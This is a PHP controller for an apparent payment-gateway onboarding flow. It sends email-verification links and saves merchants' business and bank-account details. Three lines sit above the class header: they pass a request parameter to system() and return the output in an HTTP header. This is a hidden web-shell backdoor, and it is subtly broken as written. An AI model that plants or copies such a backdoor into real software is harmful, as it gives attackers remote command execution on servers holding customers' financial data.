<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

/**
 * Get Started Controller
 *
 * First Time account set up
 *
 * @version 1.0
 * @author Everpay Corporation.
 * @package OpenGateway

 */
class Get_started extends Controller
{

    function __construct()
    {
        parent::__construct();
        // error_reporting(E_ALL);
        // ini_set('display_errors',1);
        // perform control-panel specific loads
        CPLoader();
    }

    function index() {
        //echo "hii";die;
        $this->load->model('cp/user');

        $verified = array();
        $verified_count = 0;
        $verified['email'] = $this->user->check_email_verified();
        $verified['bank'] = $this->user->check_bank_verified();
        $verified['business'] = $this->user->check_business_verified();

        foreach($verified as $v) {
            if($v) {
                $verified_count++;
            }
        }

        $client_id=$this->session->userdata('client_id');
        $clients=$this->user->get_client_details($client_id);
       
        $this->load->model('states_model');
		$countries = $this->states_model->GetCountries();
        

        $data = array(
            'countries' => $countries,
            'clients' => $clients,
            'verified' => $verified,
            'verified_count' => $verified_count
        );

        $this->load->view('cp/get_started',$data);
         
    }

    function resend_email_link() {
        $this->load->model('cp/user');
        $client_id = $this->session->userdata('client_id');

        $generatedKey = sha1(mt_rand(10000,99999).time().$this->user->active_user->email);
        $activation_link  = "<center style=\"width: 100%; min-width: 580px;\">\n"; 
        $activation_link .= "<table class=\"button verify-button\" style=\"border-spacing: 0; border-collapse: collapse; vertical-align: top; text-align: left; width: 200px; overflow: hidden; padding: 0;\"><tr style=\"vertical-align: top; text-align: left; padding: 0;\" align=\"left\"><td style=\"word-break: break-word; -webkit-hyphens: auto; -moz-hyphens: auto; hyphens: auto; border-collapse: collapse !important; vertical-align: top; text-align: center; color: #ffffff; font-family: 'Helvetica Neue', 'Arial', sans-serif; font-weight: normal; line-height: 19px; font-size: 14px; display: block; width: auto !important; border-radius: 4px; background: #48A4CF; margin: 0; padding: 13px 0 12px;\" align=\"center\" bgcolor=\"#48A4CF\" valign=\"top\">\n"; 
        $activation_link .= "<a href=https://everpayinc.com/get_started/email_activation/".$generatedKey." style=\"color: #ffffff; text-decoration: none; font-weight: bold; font-family: Helvetica, Arial, sans-serif; font-size: 15px;\" target='_blank'>Verify Your Email</a>\n"; 
        $activation_link .= "</td>\n"; 
        $activation_link .= "</tr></table></center>\n";

        $this->user->update_client($client_id, array(
            'email_code' => $generatedKey,
            'email_code_expire' => date('Y-m-d h:i:s', strtotime('+1 day'))
        ));
        send_activation_code($this->user->active_user->first_name,$activation_link,$this->user->active_user->email);
        $this->notices->SetNotice('A verification link has been sent to your registered email id');
        redirect('/get_started');
        die();
    }

    function email_activation($code = '') {
        $this->load->model('cp/user');
        $client_id = $this->session->userdata('client_id');
        if($code == $this->user->active_user->email_code) {
            if(time() < strtotime($this->user->active_user->email_code_expire)) {
                $this->user->update_client($client_id, array(
                    'email_code' => '',
                    'email_verified' => 1
                ));
                $this->notices->SetNotice('Your email has now been verified.');
            } else {
                $this->notices->SetError('The activation link has been expired');
            }
        } else {
            echo 'Hell';
            $this->notices->SetError('The activation link is not valid.');
        }

        redirect('/get_started');
        die();
    }

    function update_business()
    {
    	$this->load->model('cp/user');
    	$client_id = $this->session->userdata('client_id');

        $data['business_address'] = $this->input->post('business_address');
        $data['business_address2'] = $this->input->post('business_address2');
        $data['business_city'] = $this->input->post('business_city');
        $data['business_zip'] = $this->input->post('business_zip');
        $data['business_state'] = $this->input->post('business_state');
        $data['business_country'] = $this->input->post('business_country');
        $data['business_url'] = $this->input->post('business_url');
        $data['business_phone'] = $this->input->post('business_phone');

        $error = false;
        foreach($data as $k=>$d) {
            if(empty($d)) {
                $this->notices->SetError($k.' is Required field.');
                $error = true;
            }
        }

		if(!$error) {
        	$this->user->update_business($client_id,$data);
            $this->notices->SetNotice($this->lang->line('account_updated'));
        }

        redirect('/get_started');
        die();
    }

    function update_bank() {
        $this->load->model('cp/user');
        $client_id = $this->session->userdata('client_id');

        $data['bank_name'] = $this->input->post('bank_name');
        $data['bank_acc_name'] = $this->input->post('bank_acc_name');
        $data['bank_address'] = $this->input->post('bank_address');
        $data['bank_acc_number'] = $this->input->post('bank_acc_number');
        $data['bank_routing_number'] = $this->input->post('bank_routing_number');
        $data['bank_swift_number'] = $this->input->post('bank_swift_number');
        $data['bank_acc_type'] = $this->input->post('bank_acc_type');
        // $data['business_phone'] = $this->input->post('business_phone');

        $error = false;
        foreach($data as $k=>$d) {
            if(empty($d)) {
                $this->notices->SetError($k.' is Required field.');
                $error = true;
            }
        }

        if(!$error) {
            $this->user->update_bank($client_id,$data);
            $this->notices->SetNotice($this->lang->line('account_updated'));
        }

        redirect('/get_started');
        die();
    }

}
